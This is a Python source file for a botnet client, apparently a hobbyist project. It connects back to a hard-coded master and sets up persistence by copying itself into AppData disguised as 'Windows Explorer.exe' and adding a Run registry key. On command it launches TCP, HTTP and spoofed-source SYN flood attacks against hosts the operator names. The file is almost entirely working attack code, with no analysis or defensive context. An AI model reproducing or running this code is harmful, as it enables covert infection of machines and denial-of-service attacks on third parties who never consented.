
from requests import *
from struct import *
import socket
import subprocess
import threading
import time
import pickle
import random
import os
import signal
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import shutil

def sig_handler(sig, frame):
    print("\nExiting")
    os._exit(0)

signal.signal(signal.SIGINT, sig_handler)

class BackDoor:
    def __init__(self, ip, port):

        self.i = ip
        self.p = port

        #Connect Master
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        self.become_Persistent()
        self.connected = False

        while not self.connected:
            try:

                self.connection.connect((ip, port))
                self.connected = True

            except:

                time.sleep(3)
    
    def reliable_send(self, data):

        try:

            pdata = pickle.dumps(data)
            self.connection.send(pdata)

        except socket.error:

            time.sleep(3) 

            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            self.connected = False

            while not self.connected:

                try:

                    self.connection.connect((self.i, self.p))
                    self.connected = True

                except:

                    time.sleep(3) 
       
    def reliable_recieve(self):
        pdata = ""
        while True:
            try:
                
                pdata = self.connection.recv(1024)
                return pickle.loads(pdata)

            except EOFError:          
                continue  

    def become_Persistent(self):
        try:
            
            evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"

            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d + "'+ evil_file_location + '"', shell = True)     

        except KeyError:
            pass

    def Exit(self):
        self.connection.close()
        

    def KILL(self):
        exit()

    def error(self):
        return "\n[!] Incorrect Command"
    
    def attack(self, hosts, ports):

        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        soc.connect((hosts, ports))
    
        byt = random._urandom(51200)
        url = '/'
        fake_ip = '182.21.20.32'
        
        try:

            soc.send(byt)
            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+hosts+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+hosts+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())

        except socket.error as error:

            print(error)

        finally:

            soc.close()


    def checksum(self, msg):
        s = 0

        for i in range(0, len(msg), 2):
            w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
            s = s + w
        
        s = (s>>16) + (s & 0xffff);

        s = ~s & 0xffff
        
        return s


    def HeaderSyn(self, hosts):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        packet = '';

        global source_ip
        global dest_ip
        source_ip = '186.89.217.114'
        dest_ip = hosts

        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = random.randint(1, 255)
        protocol = socket.IPPROTO_TCP
        check = 10
        saddr = socket.inet_aton (source_ip)
        daddr = hosts
        ihl_version = (version << 4) + ihl
        global ip_header
        ip_header =  pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        
    def Tcp(self, hosts, ports):
        self.HeaderSyn(hosts)
        source = random.randint(36000, 65535)
        dest = ports
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
        psh = psh + tcp_header;
        tcp_checksum = self.checksum(psh)
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
        global packet
        packet = ip_header + tcp_header


    def attackSyn(self, hosts, ports):
        try:

            self.Tcp(hosts, ports)
            s.sendto(packet, (dest_ip, 0))

        except socket.error as error:
            print(error)
    
    def execute(self, numreq, hosts, ports):
        for i in range(numreq):
            thread = threading.Thread(target=self.attack, args=(hosts, ports))
            thread.start()

            time.sleep(0.01)

        return "\n [!] Acttactinkg Target Server [!]"

    def executesyn(self, numreq, hosts, ports):
        for i in range(numreq):
            thread = threading.Thread(target=self.attackSyn, args=(hosts, ports))
            thread.start()

            time.sleep(0.01)

        return "\n [!] Acttactinkg Target Server [!]"

    def syn(self, hosts, ports):
    
        ip = hosts
        port = ports

        host = IP(dst=ip)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X" * 65000)
        p = host / tcp / raw
        send(p, loop=1, verbose=0)

    def ssyn(self, numreq, hosts, ports):
        for i in range(numreq):
            thread = threading.Thread(target=self.syn, args=(hosts, ports))
            thread.start()
            time.sleep(0.01)

        return "\n [!] Acttactinkg Target Server [!]"


    def run(self):

        while True:  

            command = self.reliable_recieve()

            if command[0] == "exit":
                command_result = self.Exit()
            
            elif command[0] == "acttack" and len(command) > 1:
                
                command_result = self.execute(int(command[1]), command[2], int(command[3]))

            elif command[0] == "kill":
                
                command_result = self.KILL()
            
            elif command[0] == "acttacksyn" and len(command) > 1:
                
                command_result = self.executesyn(int(command[1]), command[2], int(command[3]))

            elif command[0] == "syn" and len(command) > 1:
                
                command_result = self.ssyn(int(command[1]), command[2], int(command[3]))


            else:

                command_result = self.error()
            
            self.reliable_send(command_result)

Back = BackDoor("192.168.0.107", 1234)
Back.run()


